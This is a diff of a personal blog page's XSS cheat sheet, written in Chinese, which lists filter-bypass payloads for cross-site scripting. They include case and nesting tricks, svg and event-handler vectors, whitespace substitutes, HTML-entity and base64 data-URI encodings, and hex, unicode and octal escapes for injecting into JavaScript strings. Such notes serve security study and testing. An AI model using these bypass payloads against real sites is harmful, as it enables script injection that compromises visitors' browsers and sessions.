@@ -15,7 +15,7 @@
 <meta property="og:url" content="https://ghcdgit.github.io/2018/02/21/XSS-总结/index.html">
 <meta property="og:site_name" content="GHC&#39;s Blog">
 <meta property="og:description" content="关于xss的一些总结">
-<meta property="og:updated_time" content="2018-02-21T10:14:11.468Z">
+<meta property="og:updated_time" content="2018-03-11T06:38:40.657Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="XSS 总结">
 <meta name="twitter:description" content="关于xss的一些总结">
@@ -171,32 +171,35 @@
         <p>关于xss的一些总结</p>
 <a id="more"></a>
 <p>1、未过滤</p>
-<pre><code>&lt;script&gt;alert(1)&lt;/script&gt;
-&lt;img src=# onerror/onclick=alert(1)&gt;
-&lt;a href=# onclick/onmouseover=alert(1)&gt;xss&lt;/a&gt;
-&lt;a href=javascript:alert(1)&gt;xss&lt;/a&gt;
-</code></pre><p>2、过滤script，\<script\></script\></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;scscriptript&gt;alert(1)&lt;/scscriptript&gt;</span><br><span class="line">&lt;Script&gt;alert(1)&lt;/script&gt;</span><br><span class="line">&lt;img src=# onerror/onclick=alert(1)&gt;</span><br><span class="line">&lt;a href=# onclick/onmouseover=alert(1)&gt;&lt;/a&gt;</span><br><span class="line">&lt;a href=javascript:alert(1)&gt;xss&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="number">1</span>)&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;img src=# onerror/</span>onclick=alert(<span class="number">1</span>)&gt;</span><br><span class="line">&lt;a href=# onclick/onmouseover=alert(1)&gt;xss&lt;/a&gt;</span><br><span class="line">&lt;a href=javascript:alert(<span class="number">1</span>)&gt;xss&lt;<span class="regexp">/a&gt;</span></span><br></pre></td></tr></table></figure>
+<p>2、过滤script，\<script\></script\></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;scscriptript&gt;alert(<span class="number">1</span>)&lt;<span class="regexp">/scscriptript&gt;</span></span><br><span class="line"><span class="regexp">&lt;Script&gt;alert(1)&lt;/</span>script&gt;</span><br><span class="line">&lt;img src=# onerror/onclick=alert(1)&gt;</span><br><span class="line">&lt;a href=# onclick/onmouseover=alert(1)&gt;&lt;/a&gt;</span><br><span class="line">&lt;a href=javascript:alert(<span class="number">1</span>)&gt;xss&lt;<span class="regexp">/a&gt;</span></span><br></pre></td></tr></table></figure>
 <p>3、过滤img</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=# onclick/onmouseover=alert(1)&gt;&lt;/a&gt;</span><br><span class="line">&lt;a href=javascript:alert(1)&gt;xss&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=# onclick/onmouseover=alert(1)&gt;&lt;/a&gt;</span><br><span class="line">&lt;a href=javascript:alert(<span class="number">1</span>)&gt;xss&lt;<span class="regexp">/a&gt;</span></span><br></pre></td></tr></table></figure>
 <p>4、过滤on事件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=javascript:alert(1)&gt;xss&lt;/a&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=javascript:alert(<span class="number">1</span>)&gt;xss&lt;<span class="regexp">/a&gt;</span></span><br></pre></td></tr></table></figure>
 <p>5、过滤img  a  script</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg src=x onclick=alert`1`&gt;&lt;/svg&gt;</span><br><span class="line">&lt;svg src=x onclick=alert(1)&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg src=x onclick=alert<span class="string">`1`</span>&gt;&lt;/svg&gt;</span><br><span class="line">&lt;svg src=x onclick=alert(<span class="number">1</span>)&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure>
 <p>6、过滤（）</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg src=x onclick=alert`1`&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg src=x onclick=alert<span class="string">`1`</span>&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure>
 <p>7、过滤空格</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;img/**/ src=&quot;x/**/&quot;onclick=alert`1`&gt;</span><br><span class="line">&lt;img/src=&apos;1&apos;/onerror=alert`1`&gt;</span><br><span class="line">&lt;svg/onload=alert`1`&gt;</span><br><span class="line">&lt;img%0a%0dsrc=x%0a%0donerror=alert(1)&gt;</span><br><span class="line">&lt;iframe%0asrc=x%0donmouseover=alert`1`&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;svg%0aonload=alert`1`&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;img<span class="comment">/**/</span> src=<span class="string">"x/**/"</span>onclick=alert<span class="string">`1`</span>&gt;</span><br><span class="line">&lt;img/src=<span class="string">'1'</span>/onerror=alert<span class="string">`1`</span>&gt;</span><br><span class="line">&lt;svg/onload=alert<span class="string">`1`</span>&gt;</span><br><span class="line">&lt;img%<span class="number">0</span>a%<span class="number">0</span>dsrc=x%<span class="number">0</span>a%<span class="number">0</span>donerror=alert(<span class="number">1</span>)&gt;</span><br><span class="line">&lt;iframe%<span class="number">0</span>asrc=x%<span class="number">0</span>donmouseover=alert<span class="string">`1`</span>&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;svg%<span class="number">0</span>aonload=alert<span class="string">`1`</span>&gt;&lt;/svg&gt;</span><br></pre></td></tr></table></figure>
 <p>8、过滤&lt;&gt;</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">type=image src=x onerror=alert(1)</span><br><span class="line">#input 直接注入 直接on事件也行</span><br><span class="line">javascript:alert(1)</span><br><span class="line">#href中直接注入</span><br></pre></td></tr></table></figure>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">type=image src=x onerror=alert(<span class="number">1</span>)</span><br><span class="line">#input 直接注入 直接on事件也行</span><br><span class="line">javascript:alert(<span class="number">1</span>)</span><br><span class="line">#href中直接注入</span><br></pre></td></tr></table></figure>
 <p>9、过滤alert()</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; eval(String.fromCharCode(97,108,101,114,116,40,39,120,115,115,39,41))&lt;/script)</span><br></pre></td></tr></table></figure>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt; <span class="built_in">eval</span>(<span class="built_in">String</span>.fromCharCode(<span class="number">97</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">39</span>,<span class="number">120</span>,<span class="number">115</span>,<span class="number">115</span>,<span class="number">39</span>,<span class="number">41</span>))&lt;<span class="regexp">/script)</span></span><br></pre></td></tr></table></figure>
 <p>10、HTML实体字符绕过</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">十六进制</span><br><span class="line">&lt;img src=0 onerror= &amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&gt;&lt;/img&gt;</span><br><span class="line">十进制</span><br><span class="line">&lt;img src=0 onerror= &amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&gt;&lt;/img&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">十六进制</span><br><span class="line">&lt;img src=0 onerror= &amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;&gt;&lt;/img&gt;</span><br><span class="line">十进制</span><br><span class="line">&lt;img src=0 onerror= &amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&gt;&lt;/img&gt;</span><br></pre></td></tr></table></figure>
 <p>​    <a href="https://www.toolmao.com/xsstranser" target="_blank" rel="noopener">转换链接</a></p>
 <p>​    <a href="http://www.qqxiuzi.cn/bianma/zifushiti.php" target="_blank" rel="noopener">转换链接2</a></p>
 <p>11、DATA协议</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;data:text/html;</span><br><span class="line">base64,PHNjcmlwdD5hbGVydCgnSGVsbG8gd29ybGQhJyk8L3NjcmlwdD4=&quot;&gt;click&lt;a&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">"data:text/html;</span></span><br><span class="line"><span class="string">base64,PHNjcmlwdD5hbGVydCgnSGVsbG8gd29ybGQhJyk8L3NjcmlwdD4="</span>&gt;click&lt;a&gt;</span><br><span class="line"><span class="string">"&gt;&lt;iframesrc="</span>data:text/html;base64,PHNjcmlwdD5wY</span><br><span class="line">XJlbnQuYWxlcnQoZG9jdW1lbnQuZG9tYWluKTs8L3NjcmlwdD4=<span class="string">"&gt;&lt;/iframe&gt;</span></span><br></pre></td></tr></table></figure>
+<p>12、输出在js中</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">不过我们的输出位置是在JS的字符串当中，从而我们可以使用JS字符串中的编码方式：</span><br><span class="line">Payload: \x22\x3e\x3cscript\x3ealert(<span class="built_in">document</span>.domain)\x3c/script\x3e</span><br><span class="line">我们也可以使用unicode编码：</span><br><span class="line">\u0022\u003e\u003cscript\u003ealert(<span class="built_in">document</span>.domain);\u003c/script\u003e</span><br><span class="line">以及八进制编码：</span><br><span class="line">\<span class="number">42</span>\<span class="number">76</span>\<span class="number">74</span>script\<span class="number">76</span>alert(<span class="built_in">document</span>.domain);\<span class="number">74</span>/script\<span class="number">76</span></span><br></pre></td></tr></table></figure>
+<p>13、双字节</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">GBK编码第一字节（高字节）的范围为：<span class="number">0x81</span>~<span class="number">0xFE</span></span><br><span class="line">GBK编码第二字节（低字节）的范围为：<span class="number">0x40</span>~<span class="number">0x7E</span>、<span class="number">0x80</span>~<span class="number">0xFE</span></span><br><span class="line">\符号的十六进制为<span class="number">0x5C</span>, 刚好处在GBK的低字节中，如果前面有一个高字节（如%c0），那么</span><br><span class="line">恰好会被组合成一个合法的字符，从而\被吃掉，双引号逃逸出来。</span><br></pre></td></tr></table></figure>
+<p>14、换行</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">于是又到了javascript小知识时间~ javascript字符串允许下面多行的写法：</span><br><span class="line">vara=<span class="string">"abcd\</span></span><br><span class="line"><span class="string">efgh"</span>;</span><br><span class="line">alert(a);</span><br></pre></td></tr></table></figure>
 
       
 
@@ -449,15 +452,11 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">xss</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">blog</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">gdb</a>
+                <a href="javascript:void(0)" class="js-tag color4">xss</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -465,7 +464,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">gdb</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">php</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color2">python</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -477,7 +484,27 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">wireshark</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">同源</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">csrf</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">命令执行</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">shellcode</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">调试</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -486,6 +513,10 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">文件上传</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">系统启动</a>
               </li>
             
             <div class="clearfix"></div>
